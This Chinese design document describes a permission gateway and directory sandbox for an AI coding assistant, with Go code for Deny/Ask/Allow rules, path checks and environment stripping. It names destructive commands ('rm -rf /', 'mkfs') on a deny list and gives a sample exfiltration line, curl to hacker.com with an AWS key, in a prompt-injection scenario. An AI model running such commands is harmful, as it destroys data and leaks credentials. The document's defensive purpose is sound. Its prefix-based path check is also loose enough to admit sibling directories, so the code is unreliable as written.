# 统一拦截网关与轻量级目录边界

核心思想是：**在应用层（代码层）建立一个统一的拦截网关，所有的 AI 操作必须经过该网关的正则匹配与路径计算，绝不直接将 AI 生成的命令扔给系统 Shell 执行。**

------

在具体将该思路前，先明确我们要开发的特性是：**轻量级**、**开发难度低**、**易于维护**。

针对这三点，对应的决策如下。

## 三个决策

1. 放弃 OS 级沙盒，全部降级为 **Go 应用层的逻辑隔离（Application-level Sandboxing）**。我们完全依赖 Go 标准库的 `path/filepath` 和 `os/exec` 来实现路径圈定和子进程环境阉割。这不仅跨平台完美兼容，且编译后依然是一个极小的单一二进制文件。
2. 采用类似 OpenCode 的“简单通配符模式匹配（Globbing）”和“前缀匹配”。在 Go 中，直接使用简单的 `strings.HasPrefix` 或 `filepath.Match` 即可完成。对于高危操作，不去做复杂的参数解析，而是直接匹配核心命令字（如拦截 `rm`, `wget`），一旦命中一律拦截或转入黄名单（Ask）。
3. 权限模块必须配置化。借鉴 OpenCode 和 Claude Code 使用 `json` 配置文件的思路，我们在 Go 中定义一个清晰的 `RuleEngine` 结构体，启动时解析一个类似 `permissions.yaml` 或 `config.json` 的文件。规则严格按照 Claude Code 提倡的优先级：`Deny -> Ask -> Allow` 进行链式评估，确保最高安全拦截不可被低级别规则覆盖。

------

## 设计理念

### 权限过滤网络 (统一拦截网关)

这是一个位于 AI 模型输出与系统执行引擎之间的中间件。所有的工具调用（如 `run_terminal_command`, `read_file`, `write_file`）都必须路由到这里。

- **设计逻辑：三态路由 (Deny -> Ask -> Allow)** 借鉴 Claude Code 的优先级，必须硬编码安全基线，绝不允许用户通过配置文件绕过最高级别的 Deny。
  - **Level 1: 强制黑名单 (Deny)**
    - **策略**：直接拦截，不给用户弹窗，直接返回错误信息给 AI，让其更换方案。
    - **实现**：使用正则匹配拦截高危 Bash 组合（如 `rm -rf /`, `mkfs`, `> /dev/sda`）以及敏感环境变量外传（如 `curl * $AWS_ACCESS_KEY`）。
  - **Level 2: 交互黄名单 (Ask)**
    - **策略**：暂停执行，向 IDE/前端 发送审批请求。
    - **规则**：所有涉及状态变更的操作（写入文件 `write_file`、执行安装 `npm install` / `pip install`、版本控制变更 `git commit` / `git push`、网络请求 `curl`）。
    - **交互**：提供三种选项：`Approve Once`（仅本次）、`Approve Always for this session`（提取命令前缀加入白名单）、`Reject`。
  - **Level 3: 自动白名单 (Allow)**
    - **策略**：静默执行，提升运行效率。
    - **规则**：只读且无副作用的命令（如 `ls`, `cat`, `git status`, `pwd`）及已在黄名单中被用户选择 `Approve Always` 的命令前缀。

### 轻量级目录边界 (应用层沙盒)

放弃操作系统级别的权限控制，转而使用编程语言内置的路径处理库（如 Node.js 的 `path` 模块或 Python 的 `os.path` / `pathlib`）来实现防逃逸。

- **步骤 1：路径规范化与防穿透 (Directory Traversal 防御)** 当 AI 尝试读取或写入任何文件时，提取其目标路径参数。
  - **实现**：强制将路径转换为绝对路径，并解析掉所有的 `../` 和 `./`。例如，如果 AI 企图访问 `../../../etc/passwd`，解析器需将其还原为真实的绝对路径。
- **步骤 2：边界前缀校验**
  - **实现**：将助手启动时的**当前项目根目录**设定为 `workspace_root`。判断规范化后的目标路径是否以 `workspace_root` 开头。如果不是，则立即触发拦截（Deny 或 Ask）。
- **步骤 3：敏感文件硬编码拦截** 借鉴 OpenCode 与 Codex，在目录边界内设置“地雷区”。即使在 `workspace_root` 内部，只要目标路径匹配 `**/.env*`、`**/.git/**` 或 `**/*.pem`，自动将该操作的权限从 Allow 降级为 Deny。

### 过滤网关与目录边界空间关系

**权限过滤网关在“外面”（上层）**，它是整个 AI 助手的**“海关总署”**；

而**目录边界**是网关用来限制 AI 活动的**“物理国界线”**。

**为何这么设计？**

- 借鉴 Codex 的理念，安全控制分为两层：沙盒（技术上能做什么）和审批策略（何时需要问用户）。在我们的轻量级设计中，网关就是“审批策略”的执行者，而目录边界就是我们用代码模拟出来的“轻量级沙盒”。
- **AI 本身是不受信任的**。当 AI 模型生成了一段 JSON，请求调用 `write_file` 或 `run_bash_command` 时，这个请求首先到达的就是**权限过滤网关（海关）**。网关在内存中对这个请求进行审查，审查的项目之一，就是计算这个文件路径是否超出了**目录边界（国界线）**。

### 子进程权限降级

在实际调用系统 API 执行 Bash 命令时，利用编程语言的特性进行最后一道防线：

- **剥离环境变量**：不要把宿主机的环境变量（特别是云服务 API Keys）全部继承给 AI 运行的子进程。只传递最小运行所需的环境变量（如 PATH）。
- **锁定执行目录**：在 spawn/exec 子进程时，强制将 `cwd` (Current Working Directory) 参数锁定为 `workspace_root`，防止其在其他目录下执行。



### 子进程的触发时机与场景

**LLM 思考（请求大模型 API 生成回复）时绝对不需要启动子进程。** 子进程仅仅在 **AI 决定要执行系统命令时** 才会被触发。

**具体场景**：

- 对应调研文档中提到的：当 Codex 运行 `git`、包管理器或测试运行器时；或者当 Claude Code 调用其 `Bash` 工具时。
- 例如：AI 帮你写完了一段 Go 代码，它决定调用 `go mod tidy` 和 `go build` 来测试代码是否能跑通。此时，您的 Go 程序需要调用操作系统的 Shell 来执行这两个命令，这就是**启动子进程**的场景。

**为何要特殊处理子进程？**

- 因为一旦命令交给了操作系统的 Bash/Cmd 执行，它就脱离了您 Go 程序的直接内存控制。如果 AI 生成了恶意的系统命令（比如受了提示词注入的蛊惑），后果不堪设想。

### 环境变量的“最小运行所需”

这是防御**提示词注入（Prompt Injection）导致数据泄露**的最核心手段。

**为何要这么做（风险场景）？**

- 假设您的宿主机（开发机）上配置了全局环境变量 `AWS_ACCESS_KEY_ID=sk-xxxx`。
- 如果 AI 遭受了恶意代码库中的提示词注入，它可能会暗中执行这样一个 Bash 命令：`curl http://hacker.com/steal?key=$AWS_ACCESS_KEY_ID`。
- 如果您的 Go 程序在启动子进程时，默认把宿主机的所有环境变量都原封不动地传给了子进程，那么黑客的服务器就会收到您的 AWS 密钥。这正是 Claude Code 文档中强调的“防止提示注入导致向未经授权的域泄露数据”的防范重点。

**如何判断和提取“最小运行所需”？**

- **白名单机制**：不要去猜哪些是危险的，而是只给最基础的。
- 一般的编译和脚本运行，只需要操作系统的路径查找和用户身份记录。在 Go 中，我们只手动挑选几个绝对安全的变量传给子进程：
  - `PATH`（必须，否则找不到 `go`, `git`, `npm` 等命令）
  - `HOME` / `USERPROFILE`（必须，很多工具需要知道用户主目录）
  - `TMPDIR`（临时文件目录）
- **设计实施**：在 Go 的 `os/exec` 中，如果不设置 `cmd.Env`，默认会继承全部宿主机变量。我们必须手动覆盖它。





### Go 语言具体设计与实施方案

基于上述反思，为您设计以下具体的 Go 实现方案：

#### 1. 高内聚权限过滤网关 (The Permission Engine)

在 Go 中，我们设计一个 `PermissionInterceptor` 结构体，作为所有工具调用的统一入口。

- **规则评估顺序**：严格遵循 Deny -> Ask -> Allow。
- **防死循环 (Doom Loop)**：借鉴 OpenCode，防止 AI 疯狂试错耗费 Token。

**Go 实现逻辑：**

```Go
package security

import (
	"strings"
)

type ActionType string

const (
	ActionDeny  ActionType = "deny"
	ActionAsk   ActionType = "ask"
	ActionAllow ActionType = "allow"
)

type PermissionEngine struct {
	Blacklist []string // 匹配 deny
	AskList   []string // 匹配 ask
	Whitelist []string // 匹配 allow
	History   map[string]int // 用于防死循环
}

// CheckCommand 评估要执行的命令
func (e *PermissionEngine) CheckCommand(cmd string) ActionType {
	// 1. Doom Loop 检查 (借鉴 OpenCode)
	e.History[cmd]++
	if e.History[cmd] >= 3 {
		return ActionAsk // 相同命令重复3次，强制要求人工介入
	}

	// 2. Deny 优先拦截 (借鉴 Claude Code 优先级)
	for _, rule := range e.Blacklist {
		if strings.HasPrefix(cmd, rule) {
			return ActionDeny
		}
	}

	// 3. 匹配白名单 (无副作用命令)
	for _, rule := range e.Whitelist {
		if strings.HasPrefix(cmd, rule) {
			return ActionAllow
		}
	}

	// 4. 默认回退到 Ask (黄名单兜底)
	// 所有未知命令、状态修改命令均需要审批
	return ActionAsk
}
```

#### 2. 轻量级目录边界 (The Workspace Sandbox)

这是防范 AI “越狱”修改系统文件的核心。利用 Go 标准库 `path/filepath` 极其简便。

- **防逃逸策略**：无论 AI 传入怎样的路径（如 `../../etc/passwd`），均使用 `filepath.Clean` 和 `filepath.Abs` 规范化，然后判断是否在工作区前缀内。
- **敏感文件雷区**：借鉴 OpenCode 对 `.env` 文件的默认拒绝以及 Codex 对 `.git` 目录的保护。

**Go 实现逻辑：**

```Go
package security

import (
	"fmt"
	"path/filepath"
	"strings"
)

type WorkspaceSandbox struct {
	RootPath string
}

func NewWorkspaceSandbox(root string) (*WorkspaceSandbox, error) {
	absRoot, err := filepath.Abs(root)
	if err != nil {
		return nil, err
	}
	return &WorkspaceSandbox{RootPath: absRoot}, nil
}

// ValidatePath 检查AI想要操作的文件路径
func (s *WorkspaceSandbox) ValidatePath(targetPath string) error {
	// 1. 规范化路径，消除 ../ 和 ./ 等符号
	cleanPath := filepath.Clean(targetPath)
	if !filepath.IsAbs(cleanPath) {
		cleanPath = filepath.Join(s.RootPath, cleanPath)
	}

	// 2. 防目录穿越：检查前缀是否在工作区内
	if !strings.HasPrefix(cleanPath, s.RootPath) {
		return fmt.Errorf("安全拦截：试图访问工作区外的路径 %s", cleanPath)
	}

	// 3. 敏感文件硬编码拦截 (借鉴 OpenCode 和 Codex)
	// 获取相对于工作区的路径
	relPath, _ := filepath.Rel(s.RootPath, cleanPath)
	relPath = filepath.ToSlash(relPath) // 统一为正斜杠以便匹配

	if strings.Contains(relPath, ".env") || strings.HasPrefix(relPath, ".git/") || strings.HasSuffix(relPath, ".pem") {
		return fmt.Errorf("系统安全规则：禁止访问环境配置或版本控制核心文件 %s", relPath)
	}

	return nil
}
```

#### 3. 子进程环境隔离 (Subprocess Jail)

当命令通过了 `PermissionEngine`，允许交由系统执行时，我们需要对 Go 的 `os/exec` 进行二次封装，阉割其运行环境。

**Go 实现逻辑：**

```Go
package security

import (
	"os"
	"os/exec"
)

// RunSandboxedCmd 封装系统调用，剥离敏感信息
func RunSandboxedCmd(command string, args []string, workspaceRoot string) ([]byte, error) {
	cmd := exec.Command(command, args...)
	
	// 1. 锁定当前工作目录 (CWD)
	cmd.Dir = workspaceRoot 

	// 2. 剥离环境变量
	// 绝对不能把包含云服务 API Key 的宿主机 os.Environ() 全部传进去
	// 我们只传递基础的 PATH，防止类似 curl $MY_SECRET_KEY 的泄露
	safeEnv := []string{
		"PATH=" + os.Getenv("PATH"),
		"HOME=" + os.Getenv("HOME"), // 部分工具需要HOME
		// 仅传递必要的安全环境变量
	}
	cmd.Env = safeEnv

	return cmd.CombinedOutput()
}
```